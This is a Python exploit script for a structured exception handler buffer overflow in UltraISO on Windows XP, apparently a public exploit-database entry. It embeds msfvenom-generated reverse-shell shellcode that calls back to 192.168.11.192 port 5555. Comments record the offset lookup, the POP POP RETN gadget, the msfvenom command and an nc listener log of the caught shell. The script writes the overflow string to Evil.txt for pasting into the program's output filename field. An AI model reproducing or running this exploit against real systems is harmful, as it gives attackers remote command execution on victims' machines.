#!/usr/bin/python
#TESTED ON WINDOW XP PROFESSIONAL XP
#root@kali:~/Desktop# /usr/bin/msf-pattern_offset -q 336B4132
#[*] Exact match at offset 308
#copy the text content and paste it in "TOOLS>MAKE CD/DVD IAGE > OUTPUT FILE NAME "
#root@kali:~# nc -nvlp 5555
#listening on [any] 5555 ...
#connect to [192.168.11.192] from (UNKNOWN) [192.168.11.177] 1209
#Microsoft Windows XP [Version 5.1.2600]
#(C) Copyright 1985-2001 Microsoft Corp.
#
#C:\Program Files\UltraISO>
#

#72D11225   5F               POP EDI
#72D11226   5E               POP ESI
#72D11227   C2 0C00          RETN 0C

#root@kali:~/Desktop# msfvenom -p windows/shell_reverse_tcp lhost=192.168.11.192 lport=5555 -f python -e x86/alpha_mixed
#[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
#[-] No arch selected, selecting arch: x86 from the payload
#Found 1 compatible encoders
#Attempting to encode payload with 1 iterations of x86/alpha_mixed
#x86/alpha_mixed succeeded with size 710 (iteration=0)
#x86/alpha_mixed chosen with final size 710
#Payload size: 710 bytes
#Final size of python file: 3400 bytes
buf =  ""
buf += "\x89\xe2\xd9\xc1\xd9\x72\xf4\x5b\x53\x59\x49\x49\x49"
buf += "\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
buf += "\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
buf += "\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
buf += "\x58\x50\x38\x41\x42\x75\x4a\x49\x69\x6c\x79\x78\x6b"
buf += "\x32\x47\x70\x75\x50\x47\x70\x55\x30\x4b\x39\x78\x65"
buf += "\x54\x71\x39\x50\x63\x54\x6c\x4b\x36\x30\x44\x70\x6e"
buf += "\x6b\x30\x52\x74\x4c\x6c\x4b\x31\x42\x36\x74\x6e\x6b"
buf += "\x53\x42\x36\x48\x66\x6f\x4d\x67\x33\x7a\x54\x66\x50"
buf += "\x31\x39\x6f\x4c\x6c\x55\x6c\x51\x71\x53\x4c\x56\x62"
buf += "\x44\x6c\x77\x50\x7a\x61\x6a\x6f\x46\x6d\x65\x51\x4f"
buf += "\x37\x5a\x42\x5a\x52\x62\x72\x46\x37\x6c\x4b\x56\x32"
buf += "\x42\x30\x6c\x4b\x50\x4a\x35\x6c\x4e\x6b\x30\x4c\x46"
buf += "\x71\x53\x48\x78\x63\x50\x48\x57\x71\x58\x51\x50\x51"
buf += "\x6c\x4b\x72\x79\x75\x70\x55\x51\x78\x53\x6e\x6b\x67"
buf += "\x39\x42\x38\x6d\x33\x37\x4a\x33\x79\x6c\x4b\x50\x34"
buf += "\x6c\x4b\x37\x71\x6b\x66\x74\x71\x69\x6f\x4e\x4c\x79"
buf += "\x51\x5a\x6f\x46\x6d\x56\x61\x4b\x77\x67\x48\x69\x70"
buf += "\x32\x55\x59\x66\x66\x63\x53\x4d\x4a\x58\x35\x6b\x63"
buf += "\x4d\x36\x44\x54\x35\x38\x64\x31\x48\x4e\x6b\x52\x78"
buf += "\x67\x54\x46\x61\x68\x53\x51\x76\x6e\x6b\x74\x4c\x50"
buf += "\x4b\x4c\x4b\x36\x38\x37\x6c\x67\x71\x38\x53\x6c\x4b"
buf += "\x34\x44\x6c\x4b\x47\x71\x5a\x70\x4f\x79\x42\x64\x71"
buf += "\x34\x44\x64\x51\x4b\x61\x4b\x45\x31\x50\x59\x50\x5a"
buf += "\x73\x61\x59\x6f\x49\x70\x63\x6f\x43\x6f\x72\x7a\x6e"
buf += "\x6b\x67\x62\x58\x6b\x4e\x6d\x31\x4d\x42\x48\x50\x33"
buf += "\x55\x62\x65\x50\x75\x50\x75\x38\x73\x47\x51\x63\x64"
buf += "\x72\x53\x6f\x61\x44\x43\x58\x52\x6c\x72\x57\x66\x46"
buf += "\x43\x37\x79\x6f\x78\x55\x4f\x48\x4c\x50\x47\x71\x35"
buf += "\x50\x43\x30\x74\x69\x38\x44\x32\x74\x66\x30\x51\x78"
buf += "\x44\x69\x4f\x70\x72\x4b\x65\x50\x6b\x4f\x59\x45\x62"
buf += "\x70\x70\x50\x70\x50\x46\x30\x43\x70\x50\x50\x77\x30"
buf += "\x36\x30\x45\x38\x6b\x5a\x34\x4f\x59\x4f\x6b\x50\x49"
buf += "\x6f\x48\x55\x6c\x57\x62\x4a\x34\x45\x51\x78\x6f\x30"
buf += "\x4d\x78\x34\x4b\x4f\x30\x61\x78\x65\x52\x35\x50\x34"
buf += "\x55\x38\x33\x6f\x79\x4b\x56\x43\x5a\x64\x50\x63\x66"
buf += "\x62\x77\x71\x78\x7a\x39\x4d\x75\x72\x54\x45\x31\x39"
buf += "\x6f\x38\x55\x4f\x75\x6b\x70\x34\x34\x54\x4c\x49\x6f"
buf += "\x42\x6e\x75\x58\x54\x35\x7a\x4c\x61\x78\x58\x70\x38"
buf += "\x35\x4d\x72\x51\x46\x39\x6f\x78\x55\x70\x68\x45\x33"
buf += "\x42\x4d\x33\x54\x77\x70\x6b\x39\x38\x63\x53\x67\x32"
buf += "\x77\x51\x47\x45\x61\x79\x66\x31\x7a\x75\x42\x32\x79"
buf += "\x50\x56\x58\x62\x59\x6d\x31\x76\x78\x47\x62\x64\x61"
buf += "\x34\x75\x6c\x43\x31\x77\x71\x6e\x6d\x37\x34\x56\x44"
buf += "\x42\x30\x79\x56\x45\x50\x57\x34\x52\x74\x56\x30\x50"
buf += "\x56\x72\x76\x46\x36\x71\x56\x56\x36\x32\x6e\x50\x56"
buf += "\x70\x56\x46\x33\x71\x46\x55\x38\x53\x49\x7a\x6c\x75"
buf += "\x6f\x6f\x76\x39\x6f\x4b\x65\x6b\x39\x79\x70\x62\x6e"
buf += "\x71\x46\x61\x56\x79\x6f\x34\x70\x45\x38\x43\x38\x4c"
buf += "\x47\x57\x6d\x53\x50\x49\x6f\x78\x55\x4d\x6b\x78\x70"
buf += "\x6d\x65\x39\x32\x33\x66\x73\x58\x4c\x66\x6d\x45\x6d"
buf += "\x6d\x4f\x6d\x4b\x4f\x6a\x75\x77\x4c\x43\x36\x61\x6c"
buf += "\x55\x5a\x4f\x70\x6b\x4b\x39\x70\x62\x55\x76\x65\x4f"
buf += "\x4b\x32\x67\x47\x63\x32\x52\x42\x4f\x61\x7a\x43\x30"
buf += "\x66\x33\x69\x6f\x4e\x35\x41\x41"


buffer = "A"*304  + "\xEB\x06\xEB\x04"+ "\x25\x12\xD1\x72" + buf +  "D"* 6000
try:
	f=open("Evil.txt","w")
	print "[+] Creating %s bytes evil payload.." %len(buffer)
	f.write(buffer)
	f.close()
	print "[+] File created!"
except Exception as e:
	print e

